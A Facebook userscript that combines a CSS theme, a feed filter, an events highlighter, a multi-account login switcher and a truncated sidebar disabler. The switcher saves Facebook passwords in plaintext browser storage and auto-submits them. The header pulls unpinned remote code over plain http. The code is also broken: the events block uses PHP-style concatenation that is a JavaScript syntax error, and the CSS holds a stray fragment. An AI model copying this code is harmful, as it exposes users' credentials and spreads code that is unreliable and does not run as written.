// ==UserScript==
// @name          Facebook Tweak v4
// @namespace     http://www.kimocoder.net
// @description	  Facebook is plain fun!
// @version        4.0
// @author         Christian <kimocoder> Bremvaag
// @require        http://buzzy.hostoi.com/AutoUpdater.js
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// @run-at         document-end
// @include       http://www.facebook.*/* 
// @include       http://apps.facebook.com/*/*
// @include        http://*facebook.com*
// @include        https://*facebook.com/*
// @include        http://*.facebook.com/*
// @include        http://www.facebook.com/*
// @include        https://*.facebook.com/*
// @include        https://www.facebook.com/*
// @include        http://apps.facebook.com/*
// @include        http://www.*.facebook.com/*
// @include        http://www.facebook.com/*
// @match          http://www.facebook.com/*
// @match             http://*.facebook.com/*
// @match             https://*.facebook.com/*
// @include        https://www.facebook.com/*
// @match          https://www.facebook.com/*
// @exclude        http://*.facebook.com/sharer*
// @exclude        http://*.facebook.com/ajax/*
// @exclude        http://*.facebook.com/plugins/*
// @exclude        http://apps.facebook.com/*
// @exclude        http://*facebook.com/apps/*
// @include        	http:/facebook.com/*
// ==/UserScript==


(function() {
var css = "body{\n	background: #333 !important\n}\n\n#pagelet_navigation{\n	-moz-border-radius: 20px !important;\n	-moz-box-shadow: inset 0 0 3px 2px #666, 1px 1px 5px #222 !important;\n	-webkit-border-radius: 80px !important;\n	-webkit-box-shadow: 1px 1px 5px #222 !important;\n	background: #00ff00 !important;\n	background: -moz-linear-gradient(top, #eee, #fefefe) !important;\n	background: -webkit-gradient(linear, top, bottom, from(#eee), to(#fefefe)) !important;\n	border-radius: 20px !important;\n	box-shadow: inset 0 0 3px 2px #666, 1px 1px 5px #222 !important;\n	margin: 5px 5px !important;\n	padding: 10px 0 10px 10px !important;\n	width: 145px !important\n}\n\n#headNav{\n	background: #000000;\nant;\n}\n\na{\n}\n\n#pagelet_ego_pane,#pagelet_eventbox{\n	display:none\n}\n\n#content{\n	-moz-border-radius: 15px !important;\n	-moz-box-shadow: 0 0 5px 2px #111 !important;\n	-webkit-border-radius: 15px !important;\n	-webkit-box-shadow: 0 0 5px 2px #111 !important;\n	background: #111 !important;\n	background: -moz-linear-gradient(top, #111, #222) !important;\n	background: -webkit-gradient(linear, top, bottom, from(#111), to(#222)) !important;\n	border-radius: 20px !important;\n	border: 1px solid #222;\n	box-shadow: 0 0 5px 2px #111 !important;\n	margin: 5px 0 0 -5px !important;\n	padding:0px 10px 0px 10px;\n	width: 970px !important\n}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		var node = document.createElement("style");
		node.type = "text/css";
		node.appendChild(document.createTextNode(css));
		heads[0].appendChild(node); 
	}
}
})();
String.prototype.trim = function () {
    return this.replace(/^\s*/, "").replace(/\s*$/, "");
}
function getAbsPos(oId, tl) {
	var o = document.getElementById(oId);
	var val = 0;
	while (o != null && o.offsetParent != null && o.offsetParent.nodeName != "body") {
		val += (tl == 'top') ? parseInt(o.offsetTop) : parseInt(o.offsetLeft);
		o = o.offsetParent;
	}
	return val;
}
function getElementByClass(theClass, ref) {
	var allHTMLTags = ref.getElementsByTagName("*");
	var matches = [];
	for (var i = 0; i < allHTMLTags.length; i++) {
		if (allHTMLTags[i].className != null && allHTMLTags[i].className.indexOf(theClass) != -1)
			matches.push(allHTMLTags[i]);
	}
	return matches;
}
if (typeof GM_deleteValue == 'undefined') {
	if(typeof unsafeWindow == 'undefined') { 
		unsafeWindow = window; 
	}	
	GM_addStyle = function(css) {
		var style = document.createElement('style');
		style.textContent = css;
		document.getElementsByTagName('head')[0].appendChild(style);
	}
	GM_deleteValue = function(name) {
		localStorage.removeItem(name);
	}
	GM_getValue = function(name, defaultValue) {
		var value = localStorage.getItem(name);
		if (!value)
			return defaultValue;
		var type = value[0];
		value = value.substring(1);
		switch (type) {
			case 'b':
				return value == 'true';
			case 'n':
				return Number(value);
			default:
				return value;
		}
	}
	GM_log = function(message) {
		console.log(message);
	}
	 GM_registerMenuCommand = function(name, funk) {
	//todo
	}
	GM_setValue = function(name, value) {
		value = (typeof value)[0] + value;
		localStorage.setItem(name, value);
	}
}
var screenName = "";
var timer;
prepareUI();
function prepareUI() {
	if (document.getElementById("navAccount") == null) {
		// user has not signed in do nothing
		return ; 
	}
	screenName = document.getElementById("navAccountName").textContent;
	screenName = screenName.trim();
	// Adding the Filters menu
	var menu = document.getElementById("navAccount").parentNode;
	var list = document.createElement("li");
	list.setAttribute("id", "global-nav-filters")
	var anchor = document.createElement("a");
	anchor.setAttribute("id", "global-nav-filters-link");
	anchor.setAttribute("style", "color:'';position:relative");
    anchor.setAttribute("class", "topNavLink");
	anchor.addEventListener("click", toggleFilterBox, false);
	anchor.innerHTML = "Filters";
	list.appendChild(anchor);
	menu.appendChild(list);
	// Preparing the filter box
	var filterBox = document.createElement('div');
	filterBox.id = 'divFilterBox';
	document.body.appendChild(filterBox);
	filterBox.setAttribute("style","-moz-border-radius-bottomleft: 5px;-webkit-border-bottom-left-radius: 5px;-moz-border-radius-bottomright: 5px;-webkit-border-bottom-right-radius: 5px;background-color:#FFFFFF;border:1px solid #BABABA;color:#3A579A;display:none;font-size:12px;margin-right:0;margin-top:6px;padding:12px;position:absolute;right:0;text-align:left;top:34px;left:100px;width:240px;z-index:1001;opacity:1");
	filterBox.innerHTML = "<b>Use this form to filter out Updates</b>";
	// Close Button
	var closeButton  = document.createElement("span");
	closeButton.setAttribute("style", "cursor:pointer;");
	closeButton.addEventListener("click", hideFilterBox, false);
	closeButton.innerHTML = "<b>&nbsp;&nbsp;x&nbsp;</b>";
	filterBox.appendChild(closeButton);
	filterBox.appendChild(document.createElement("br"));
	filterBox.appendChild(document.createElement("br"));
	// Words Filter
	var wordsSpan = document.createElement("span");
	wordsSpan.innerHTML="Containing Words";
	filterBox.appendChild(wordsSpan);
	filterBox.appendChild(document.createElement("br"));
	var wordsFilterBox = document.createElement("input");
	wordsFilterBox.setAttribute("type", "text")
	wordsFilterBox.setAttribute("title", 'Filter out updates containing words.Use comma as a separator.');
	wordsFilterBox.addEventListener("keypress", suppressKeyStroke, true);
	wordsFilterBox.addEventListener("keydown", suppressKeyStroke, true);
	wordsFilterBox.setAttribute("id","txtWords");
	wordsFilterBox.setAttribute("value", GM_getValue(screenName + "WordsFilters", ""));
	wordsFilterBox.setAttribute("class", "inputtext");
	wordsFilterBox.setAttribute("style", "width:100%");
    wordsFilterBox.addEventListener("change", applyFilters, false);
	filterBox.appendChild(wordsFilterBox);
	filterBox.appendChild(document.createElement("br"));
	filterBox.appendChild(document.createElement("br"));
	// Case Sensitive Checkbox
	var caseCheckBox = document.createElement("input");
	caseCheckBox.setAttribute("type", "checkbox");
	caseCheckBox.setAttribute("title", "Case Sensitive");
	caseCheckBox.setAttribute("id", "chkCase");
	if (GM_getValue(screenName + "CaseSensitive", false))
		caseCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(caseCheckBox);
    caseCheckBox.addEventListener("change", applyFilters, false);
	var caseLabel = document.createElement("span");
	caseLabel.innerHTML = "&nbsp;Case Sensitive&nbsp;&nbsp;"
	filterBox.appendChild(caseLabel);
	filterBox.appendChild(document.createElement("br"));
	// Remove Likes Checkbox
	var likesCheckBox = document.createElement("input");
	likesCheckBox.setAttribute("type", "checkbox");
	likesCheckBox.setAttribute("title", "I don't care about what my friends like / recommend");
	likesCheckBox.setAttribute("id", "chkLikes");
	if (GM_getValue(screenName + "RemoveLikes", false))
		likesCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(likesCheckBox);
    likesCheckBox.addEventListener("change", applyFilters, false);
	var likesLabel = document.createElement("span");
	likesLabel.innerHTML = "&nbsp;Hide the 'Likes' from friends&nbsp;&nbsp;"
	likesLabel.setAttribute("title", "I don't care about what my friends like / recommend");
	filterBox.appendChild(likesLabel);
	filterBox.appendChild(document.createElement("br"));
	// Remove Connection Checkbox
	var conCheckBox = document.createElement("input");
	conCheckBox.setAttribute("type", "checkbox");
	conCheckBox.setAttribute("title", "I don't really care about who has be-friended whom");
	conCheckBox.setAttribute("id", "chkConnection");
	if (GM_getValue(screenName + "RemoveConnection", false))
		conCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(conCheckBox);
    conCheckBox.addEventListener("change", applyFilters, false);
	var connectionLabel = document.createElement("span");
	connectionLabel.innerHTML = "&nbsp;Hide the friend connection updates&nbsp;&nbsp;"
	connectionLabel.setAttribute("title", "I don't really care about who has be-friended whom");
	filterBox.appendChild(connectionLabel);
	filterBox.appendChild(document.createElement("br"));	
	// Remove Attachments Checkbox
	var attachmentsCheckBox = document.createElement("input");
	attachmentsCheckBox.setAttribute("type", "checkbox");
	attachmentsCheckBox.setAttribute("title", "Attachments include shared videos, photos, links, etc");
	attachmentsCheckBox.setAttribute("id", "chkAttachments");
	if (GM_getValue(screenName + "RemoveAttachments", false))
		attachmentsCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(attachmentsCheckBox);
    attachmentsCheckBox.addEventListener("change", applyFilters, false);
	var attachmentsLabel = document.createElement("span");
	attachmentsLabel.setAttribute("title", "Attachments include shared videos, photos, links, etc");
	attachmentsLabel.innerHTML = "&nbsp;Hide the attachments&nbsp;&nbsp;"
	filterBox.appendChild(attachmentsLabel);
	filterBox.appendChild(document.createElement("br"));
    // Remove Check-in Checkbox
	var placesCheckBox = document.createElement("input");
	placesCheckBox.setAttribute("type", "checkbox");
	placesCheckBox.setAttribute("title", "I don't care about where my friends check-in");
	placesCheckBox.setAttribute("id", "chkPlaces");
	if (GM_getValue(screenName + "RemovePlaces", false))
		placesCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(placesCheckBox);
    placesCheckBox.addEventListener("change", applyFilters, false);
	var placesLabel = document.createElement("span");
	placesLabel.setAttribute("title", "I don't care about where my friends check-in");
	placesLabel.innerHTML = "&nbsp;Hide Facebook Places&nbsp;&nbsp;"
	filterBox.appendChild(placesLabel);
	filterBox.appendChild(document.createElement("br"));    
    // Remove Answers Checkbox
	var answersCheckBox = document.createElement("input");
	answersCheckBox.setAttribute("type", "checkbox");
	answersCheckBox.setAttribute("title", "Hide Facebook Questions");
	answersCheckBox.setAttribute("id", "chkAnswers");
	if (GM_getValue(screenName + "RemoveAnswers", false))
		answersCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(answersCheckBox);
    answersCheckBox.addEventListener("change", applyFilters, false);
	var answersLabel = document.createElement("span");
	answersLabel.setAttribute("title", "Hide Facebook Questions");
	answersLabel.innerHTML = "&nbsp;Hide Facebook Questions&nbsp;&nbsp;"
	filterBox.appendChild(answersLabel);
	filterBox.appendChild(document.createElement("br"));
    // Remove Tickers section
	var tickersCheckBox = document.createElement("input");
	tickersCheckBox.setAttribute("type", "checkbox");
	tickersCheckBox.setAttribute("title", "Hide Facebook Tickers Section");
	tickersCheckBox.setAttribute("id", "chkTickers");
	if (GM_getValue(screenName + "RemoveTickers", false))
		tickersCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(tickersCheckBox);
    tickersCheckBox.addEventListener("change", applyFilters, false);
	var tickersLabel = document.createElement("span");
	tickersLabel.setAttribute("title", "Hide Facebook Tickers Section");
	tickersLabel.innerHTML = "&nbsp;Hide Facebook Tickers Section&nbsp;&nbsp;"
	filterBox.appendChild(tickersLabel);
	filterBox.appendChild(document.createElement("br"));
	filterBox.appendChild(document.createElement("br"));
    // Show Filtered
	var showFilteredCheckBox = document.createElement("input");
	showFilteredCheckBox.setAttribute("type", "checkbox");
	showFilteredCheckBox.setAttribute("title", "Show filtered only");
	showFilteredCheckBox.setAttribute("id", "chkShowFiltered");
	if (GM_getValue(screenName + "ShowFiltered", false))
		showFilteredCheckBox.setAttribute("checked", "true");
	filterBox.appendChild(showFilteredCheckBox);
	var showFilteredLabel = document.createElement("span");
	showFilteredLabel.setAttribute("title", "Show Filtered Posts");
	showFilteredLabel.innerHTML = "&nbsp;Show Filtered Posts only&nbsp;&nbsp;"
	showFilteredCheckBox.addEventListener("change", applyFilters, false);
	filterBox.appendChild(showFilteredLabel);
	filterBox.appendChild(document.createElement("br"));
	filterBox.appendChild(document.createElement("br"));
	// Button Bar
	var buttonBar = document.createElement("div");
	buttonBar.setAttribute("style", "width: 100%");
	buttonBar.setAttribute("align", "center");
	filterBox.appendChild(buttonBar);
	// Apply Button
	var applyFilterButton = document.createElement("button");
	applyFilterButton.setAttribute("type", "button");
	applyFilterButton.setAttribute("class", "uiButton");
	applyFilterButton.setAttribute("value", "Apply");
	applyFilterButton.innerHTML = "Apply";
	applyFilterButton.setAttribute("id", "btnApply");
	applyFilterButton.addEventListener("click", applyFilters, false);
	buttonBar.appendChild(applyFilterButton);
	var spacer = document.createElement("span");
	spacer.innerHTML = "&nbsp;&nbsp;&nbsp;"
	buttonBar.appendChild(spacer);
	// Clear Button
	var clearFilterButton = document.createElement("button");
	clearFilterButton.setAttribute("type", "button");
	clearFilterButton.setAttribute("class", "uiButton");
	clearFilterButton.setAttribute("value", "Clear");
	clearFilterButton.innerHTML = "Clear";
	clearFilterButton.setAttribute("id", "btnClear");
	clearFilterButton.addEventListener("click", clearFilters, false);
	buttonBar.appendChild(clearFilterButton);
}
function suppressKeyStroke(event) {
	event.stopPropagation();
}
var state = "closed";
function toggleFilterBox() {
	if (state == "closed") {
        showFilterBox();
    } else if (state == "opened") {
        hideFilterBox();
	}
	return ;
}
function showFilterBox() {
    var filterMenu = document.getElementById("global-nav-filters");
    filterMenu.setAttribute("style", "background-color:#FFFFFF");
    var filterMenuLink = document.getElementById("global-nav-filters-link");
	filterMenuLink.setAttribute("style", "color:#333333;position:relative");
	var filterBox = document.getElementById("divFilterBox");
	filterBox.style.left = (getAbsPos("global-nav-filters", "left") + parseInt(filterMenu.offsetWidth) - parseInt(filterBox.style.width) - 25) + "px";
	filterBox.style.display = "block";
	state = "opened";  
    if (timer != null)
        clearInterval(timer);
}
function hideFilterBox() {
    var filterMenu = document.getElementById("global-nav-filters");
	filterMenu.setAttribute("style", "background-color:''");
	var filterMenuLink = document.getElementById("global-nav-filters-link");
	filterMenuLink.setAttribute("style", "color:'';position:relative");
	var filterBox = document.getElementById("divFilterBox");
	filterBox.style.display = "none";
    state = "closed";
    timer = setInterval("document.getElementById('btnApply').click();", 1000 * 15);
}
function clearFilters () {
	var txtWords = document.getElementById('txtWords');
	var chkCase = document.getElementById('chkCase');
    var chkLikes = document.getElementById('chkLikes');
	var chkConnection = document.getElementById('chkConnection');
	var chkAttachments = document.getElementById('chkAttachments');
    var chkPlaces = document.getElementById('chkPlaces');
    var chkAnswers = document.getElementById('chkAnswers');
    var chkTickers = document.getElementById('chkTickers');
    var chkShowFiltered = document.getElementById('chkShowFiltered');	
	txtWords.value = "";
	chkCase.checked = false;
	chkLikes.checked = false;
	chkConnection.checked = false;
	chkAttachments.checked = false;
    chkPlaces.checked = false;
    chkAnswers.checked = false;
    chkTickers.checked = false;
    chkShowFiltered.checked = false;
	applyFilters(null);
    hideFilterBox();
};
function applyFilters (evnt) {	
	var txtWords = document.getElementById('txtWords');
	var chkCase = document.getElementById('chkCase');
	var chkLikes = document.getElementById('chkLikes');
	var chkConnection = document.getElementById('chkConnection');
	var chkAttachments = document.getElementById('chkAttachments');
    var chkPlaces = document.getElementById('chkPlaces');
    var chkAnswers = document.getElementById('chkAnswers'); 
    var chkTickers = document.getElementById('chkTickers');
    var chkShowFiltered = document.getElementById('chkShowFiltered');	
	var wordsStr = txtWords.value;
	var caseSensitive = chkCase.checked;
	var removeLikes = chkLikes.checked;
	var removeConnection = chkConnection.checked;
	var removeAttachments = chkAttachments.checked;
    var removePlaces = chkPlaces.checked;
    var removeAnswers = chkAnswers.checked;
    var removeTickers = chkTickers.checked;
    var showFiltered = chkShowFiltered.checked;
    // Saving the filter values
	try {
		GM_setValue(screenName + "WordsFilters", wordsStr);
		GM_setValue(screenName + "CaseSensitive", caseSensitive);
		GM_setValue(screenName + "RemoveLikes", removeLikes);
		GM_setValue(screenName + "RemoveConnection", removeConnection);
		GM_setValue(screenName + "RemoveAttachments", removeAttachments);
        GM_setValue(screenName + "RemovePlaces", removePlaces);
        GM_setValue(screenName + "RemoveAnswers", removeAnswers);
        GM_setValue(screenName + "RemoveTickers", removeTickers);
        GM_setValue(screenName + "ShowFiltered", showFiltered);
	} catch(e) {}
    // Removing the Tickers Section
    var divTickers = document.getElementById('pagelet_rhc_ticker');
    if (divTickers != null) {
        if (removeTickers)
            divTickers.style.display = "none";
        else
            divTickers.style.display = "block";
    }
	// Cleaning the input
	wordsStr = wordsStr.trim();
	var statuses = document.evaluate(".//*[@id='home_stream']/li", document, null, XPathResult.ANY_TYPE, null); 
    var matchedStatuses = [];
	var unmatchedStatuses = []; 
	var status = statuses.iterateNext(); 
	// Check if the user is in profile page
	if (status == null) {
		statuses = document.evaluate(".//*[@id='profile_minifeed']/li", document, null, XPathResult.ANY_TYPE, null); 
		status = statuses.iterateNext(); 
	}
    // Check if the user is in groups page
    if (status == null) {
        statuses = document.evaluate(".//*[@id='pagelet_group_mall']/ul/li", document, null, XPathResult.ANY_TYPE, null);
        status = statuses.iterateNext();
    }
	while (status) {
		var content = status.textContent;
		// Filtering the likes and friend connection
		var passiveContents = getElementByClass("uiStreamPassive", status);
		var passiveContent = (passiveContents.length > 0) ? passiveContents[0].textContent : "";
		passiveContent = passiveContent.toLowerCase();
		// Getting the attachment title
		var attachments = getElementByClass("uiAttachmentTitle", status);
		// Cleaning up the contents
		if (content == null || content.length == 0)
			content = "";
		if (!caseSensitive) {
			content = content.toLowerCase();
		}
		var found = false;
		// Like filtering
		if (removeLikes && (passiveContent.indexOf(" likes ") != -1 || passiveContent.indexOf(" recommends ") != -1 || passiveContent.indexOf(" like ") != -1 || passiveContent.indexOf(" recommend ") != -1))
			found = true;
		// Friend Connection filtering
		if (!found && removeConnection && (passiveContent.indexOf(" now friends with ") != -1 || passiveContent.indexOf(" now friends.") != -1))
			found = true;
		// Filtering attachments. Shared Links, Videos, Photos, etc.
		if (!found && removeAttachments) {
			if (attachments.length > 0)
				found = true;
			else {
				// Check for attachments without title on the stream
				attachments = getElementByClass("uiStreamAttachments", status);
				if (attachments.length > 0)
					found = true;
				else {
					// Check for attachments title on profile page
					attachments = getElementByClass("UIStoryAttachment_Title", status);
					if (attachments.length > 0)
						found = true;
					else {
						attachments = getElementByClass("UIStoryAttachment", status);
						if (attachments.length > 0)
							found = true;
					}
				}
			}
		}
        // Filtering Facebook Places
		if (!found && removePlaces && (passiveContent.indexOf(" at ") != -1 || passiveContent.indexOf(" is at ") != -1 || passiveContent.indexOf(" was at ") != -1 || passiveContent.indexOf(" are at ") != -1 || passiveContent.indexOf(" were at ") != -1 ))
			found = true;
        // Filtering Facebook Questions
		if (!found && removeAnswers && (passiveContent.indexOf(" answered ") != -1 || passiveContent.indexOf(" asked ") != -1 || passiveContent.indexOf(" replied to ") != -1))
			found = true;
		// Keywords filtering
		if (!found) {
			var wordFilters = wordsStr.split(",");
			for (var i = 0; i < wordFilters.length; i++) {
				var filter = wordFilters[i].trim();
				if (filter == "")
					continue;
				if (!caseSensitive)
					filter = filter.toLowerCase();
				if (content.indexOf(filter) != -1) {
					found = true;
					break;
				} 
			}
		}		
		if (found) {
			matchedStatuses.push(status);
		} else {
			unmatchedStatuses.push(status);
		}		
		status = statuses.iterateNext();
	}
	// Need to do this outside the iteration as the iterator will be invalidated if there are any updates to the DOM
	// Refer to https://developer.mozilla.org/en/DOM/document.evaluate
	for (i = 0; i < matchedStatuses.length; i++) {
        if (showFiltered)
		    matchedStatuses[i].style.display = 'block';
        else
            matchedStatuses[i].style.display = 'none';
	}
	for (i = 0; i < unmatchedStatuses.length; i++) {
        if (showFiltered)
		    unmatchedStatuses[i].style.display = 'none';
        else
            unmatchedStatuses[i].style.display = 'block';
	}
    var filteredCount = 0;
    if (showFiltered)
        filteredCount = unmatchedStatuses.length;
    else
        filteredCount = matchedStatuses.length;
	var linkFilters = document.getElementById("global-nav-filters-link");
	if (filteredCount > 0) {
		linkFilters.innerHTML = "Filters <span class='jewelCount' style='background-color: #F03D25;border: 0px;border-radius: 2px;-webkit-border-radius: 2px;-moz-border-radius: 2px; top: 0px; right: 0px; position: absolute; display: block;padding: 1px 2px 0px 1px;'><span>" + filteredCount + "</span></span>";
	} else {
		linkFilters.innerHTML = "Filters";
	}
    if (evnt != null && evnt.type == "click")
        hideFilterBox();        
};
(function(d){
    const gm_class = ' gm_highlight_events';
    const script_id = 49585,
          script_version = '1.2.1';
    const highlightColor = '#FFF8CC';
    function formatEvents()
    {
        var content;
        if (content = d.getElementById('rightCol')) {
            if (events = content.querySelector('#events_upcoming span.visible')) {
                if (events.className.indexOf(gm_class) >= 0) {
                    return false;
                }
                events.className += gm_class;
                var links = events.getElementsByTagName('a');
                if (links.length <= 2) {
                    return;
                }
                var birthday = links[0].innerHTML;
                var html = '';
                for (var i = 1; i < links.length; i++) {
                    html += ''
                        + '<div class="highlight">'
                        +     birthday . ': '
                        +     '<a href="' + links[i] + '" >'
                        +       links[i].innerHTML
                        +     '</a>'
                        + '</div> ';
                }
                events.innerHTML = html;
                delete events, links, birthday, html;
            }
        }
        return false;
    }
    function addStyle(css) {
    	if (typeof GM_addStyle !== 'undefined') { return GM_addStyle(css); }
    	else if (heads = d.getElementsByTagName('head')) {
    		var style = d.createElement('style');
    		try { style.innerHTML = css; }
    		catch(x) { style.innerText = css; }
    		style.type = 'text/css';
    		heads[0].appendChild(style);
    	}
        return false;
    }
    /* Start script */
    formatEvents();
    addStyle(
       ' #events_upcoming .visible{background:' + highlightColor + ';border-bottom:1px solid #FFE222;display:block;margin:-1px 0 3px;padding:1px 2px;}'
      +' .visible a[href="/events/birthdays/"]{display: none;}'
    );
    if (home_stream = d.getElementById('content')) {
        setTimeout (function () {
            var t; // timeout
            home_stream.addEventListener(
                "DOMNodeInserted",
                function () {
                    clearTimeout(t);
                    t = setTimeout(formatEvents, 500);
                },
                false
            );
        }, 2000);
        /* AutoUpdater */
        if (typeof autoUpdate == 'function') {
            autoUpdate (script_id, script_version);
        }
    }
})(document);
var userString = new Array();  
if (document.getElementById("email") && document.getElementById("pass")) {
  fE = document.getElementById("email");
  fP = document.getElementById("pass");
  fTr = fE.parentNode.parentNode;
  suppressMenu = 0;
  if (GM_getValue("FBMUL_NextUser") != undefined) {
    nextUser = GM_getValue("FBMUL_NextUser");
    GM_deleteValue("FBMUL_NextUser");
    autoLogin(nextUser);    
  }
  else {
    oSel = buildMenu();
    addMenuOptions(false);
    if (fTr.tagName == "TR") {
      var newCell = fTr.insertCell(0);
      newCell.appendChild(oSel);
    }
      else if (fE.parentNode.tagName == "DIV") {
      var oDiv = document.createElement("DIV");
      oDiv.className = "form_row clearfix";
      fE.parentNode.appendChild(oDiv);
      oDiv.appendChild(oSel);
    }
  }
}
if (document.getElementById("fb_menu_account")) {
  fName = document.getElementById("fb_menu_account");
  fUL = fName.parentNode;
  oSel = buildMenu();
  addMenuOptions(false);
  var oLi = document.createElement("LI");
  oLi.className  = 'fb_menu';
  fUL.appendChild(oLi);
  oLi.appendChild(oSel);
}
if (document.getElementById("navAccountName")) {
  fName = document.getElementById("navAccountName");
  fUL = fName.parentNode.parentNode.parentNode.parentNode;
  oSel = buildMenu();
  addMenuOptions(false);
  var oLi = document.createElement("LI");
  oLi.className  = 'fb_menu';
  fUL.insertBefore(oLi,fUL.firstChild);
  oLi.appendChild(oSel);
}
function buildMenu() {
  var oSel = document.createElement("SELECT");
  oSel.style.marginTop = '4px';
  oSel.addEventListener('change', menuSelected, false);
  return(oSel);
}
function addMenuOptions(resetOpt) {
  if (resetOpt == true) {
    if ( oSel.hasChildNodes() ) {
      while ( oSel.childNodes.length >= 1 ) {
        oSel.removeChild( oSel.firstChild );       
      } 
    }
  }
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = "Who?"; oOpt.style.color = 'gray'; oSel.appendChild(oOpt);
  if (GM_listValues().length > 0) {
     // Swith Users Group
     var userGroup = document.createElement("OPTGROUP"); userGroup.label = "Switch User";  oSel.appendChild(userGroup);
     // Edit Users Group
     var editGroup=document.createElement("OPTGROUP"); editGroup.label = "Edit User";  oSel.appendChild(editGroup);
     // Delete Users Group
     var deleteGroup=document.createElement("OPTGROUP"); deleteGroup.label = "Delete User";  oSel.appendChild(deleteGroup);
     // Add List of Users to each Group
     var gmValues = GM_listValues();
     gmValues.sort();
     for (i = 0; i < gmValues.length; i++){
        if (gmValues[i].substr(0,11)=="FBMUL_User_") {
          displayName = gmValues[i].substr(11);
          appendUser(displayName, userGroup, editGroup, deleteGroup);
        }
     }
  }   
  var oOptAU = document.createElement("OPTION"); oOptAU.innerHTML = "Add User"; oOptAU.style.fontStyle='italic'; oSel.appendChild(oOptAU);
  var oOptAU = document.createElement("OPTION"); oOptAU.innerHTML = "Help"; oOptAU.style.fontStyle='italic'; oSel.appendChild(oOptAU);
}
function appendUser(t,g1,g2,g3) {
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g1.appendChild(oOpt);
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g2.appendChild(oOpt);
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g3.appendChild(oOpt);
}
function menuSelected() {
  muIndex = oSel.selectedIndex;
  mySelOpt = oSel.options[muIndex];
  muParent = mySelOpt.parentNode;
  if (muParent.label == "Switch User") {
    if (document.getElementById("fb_menu_account")||document.getElementById("navAccountName")) {
      logMeOut(mySelOpt.innerHTML);
    }
    else {
      autoLogin(mySelOpt.innerHTML);
    }
  }
  else if (muParent.label == "Edit User") {
    editUser(mySelOpt);
  }
  else if (muParent.label == "Delete User") {
    deleteUser(mySelOpt);
  }
  else if (mySelOpt.innerHTML == "Add User") {
    addUser();
  }
  else if (mySelOpt.innerHTML == "Help") {
    showHelp();
  }
}
function autoLogin(userName) {
  userString = GM_getValue("FBMUL_User_" + userName).split("|");
  fE.value = userString[1];
  fP.value = userString[2];
  document.getElementsByName("persistent")[0].checked = true;
  fE.form.submit();
}
function logMeOut(userName) {
  GM_setValue("FBMUL_NextUser", userName);
  myInputs = document.getElementById("logout_form").submit();
}
  function addUser() {
  //note: "replace(/^\s+|\s+$/g, '')" trims leading and trailing spaces from input variables
  var userName = prompt("What name do you want to display on this menu?","").replace(/^\s+|\s+$/g, '');
  if (userName == null) { return 0 }
  var gmValues = GM_listValues();
  for (i = 0; i < gmValues.length; i++){
     if (gmValues[i] == "FBMUL_User_" + userName) {
        alert("A user with this name already exists!");
        oSel.selectedIndex = 0;
        break;
     }
  }
  if (oSel.selectedIndex > 0) {
    var userEmail = prompt("Enter the e-mail address for this Facebook account","").replace(/^\s+|\s+$/g, '');
    if (userEmail == null) { return 0 }
    var userPass = prompt("Enter the Facebook password","").replace(/^\s+|\s+$/g, '');
    if (userPass == null) { return 0 }
    var fmtString = userName + "|" + userEmail + "|" + userPass 
    GM_setValue("FBMUL_User_" + userName, fmtString);
    addMenuOptions(true);
    oSel.selectedIndex = 0;
    return 1;
  }
}  
function editUser(selOpt) {
  orgUserName = selOpt.innerHTML;
  userString = GM_getValue("FBMUL_User_" + orgUserName).split("|");
  orgEmail = userString[1];
  orgPassword = userString[2];
  newUserName = prompt("What name do you want to display on this menu?",orgUserName).replace(/^\s+|\s+$/g, '');
  if (newUserName == null) { return 0 }
  if (newUserName != orgUserName) {
    var gmValues = GM_listValues();
    for (i = 0; i < gmValues.length; i++){
       if (gmValues[i] == "FBMUL_User_" + newUserName) {
          alert("A user with this name already exists!");
          oSel.selectedIndex = 0;
          break;
       }
    }
  }
  if (oSel.selectedIndex > 0) {
    var userEmail = prompt("Enter the e-mail address for this Facebook account",orgEmail).replace(/^\s+|\s+$/g, '');
    if (userEmail == null) { return 0 }
    var userPass = prompt("Enter the Facebook password",orgPassword).replace(/^\s+|\s+$/g, '');
    if (userPass == null) { return 0 }
    var fmtString = newUserName + "|" + userEmail + "|" + userPass 
    GM_setValue("FBMUL_User_" + newUserName, fmtString);
    GM_deleteValue("FBMUL_User_" + orgUserName);
    addMenuOptions(true);
    oSel.selectedIndex = 0;
    return 1;
  }
}
function deleteUser(selOpt) {
  userName = selOpt.innerHTML;
  var r = confirm("Are you sure you want to delete the user " + userName + "?");
  if (r == true) {
    GM_deleteValue("FBMUL_User_" + userName);
    addMenuOptions(true);
  }
  oSel.selectedIndex = 0;
}

function showHelp() {
  GM_openInTab("http://userscripts.org/scripts/show/57400");
  oSel.selectedIndex = 0;
  }
(function(){
    
	if (!(/^https?:\/\/.*\.facebook\.com\/.*$/.test(window.location.href))) {
		return;
	}
	if (window.top!==window.self) {
		return;
	}
	var fbsidebardisabler=function(){
		var localstore;
		if (typeof window.fbsidebardisabler_localstore!="undefined") {
			localstore=window.fbsidebardisabler_localstore;
			window.fbsidebardisabler_localstore=null;
			delete window.fbsidebardisabler_localstore;
		}
		if (!localstore) {
			localstore={
				getItem:function(itemName,callback){
					try {
						callback(window.localStorage.getItem(itemName));
						return;
